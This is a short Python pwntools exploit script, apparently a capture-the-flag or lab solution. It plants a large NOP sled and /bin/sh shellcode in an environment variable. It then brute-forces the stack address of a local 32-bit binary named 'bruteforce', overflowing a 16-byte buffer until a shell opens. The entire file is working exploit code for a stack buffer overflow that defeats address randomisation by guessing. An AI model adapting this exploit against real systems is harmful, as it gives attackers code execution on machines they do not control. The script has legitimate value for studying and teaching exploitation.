#!/usr/bin/env python

from pwn import *
import random

# 32-bit Linux
context(arch='i386', os='linux')

nopsled = b'\x90' * 100 * 1024
sc = asm(shellcraft.sh())
env = nopsled + sc

while True:
    idx = random.randint(0, 0xfffff)

    io = process('./bruteforce', env={'SC': env})

    addr = (0xff << 24) + (idx << 4) + 0xc
    print(f'addr = {hex(addr)}')

    payload = b'a' * 16 + p32(addr)
    io.sendline(payload)

    try:
        io.recv(timeout=1)
        break
    except EOFError:
        io.terminate()
        io.wait()
        io.close()
        continue

io.interactive()
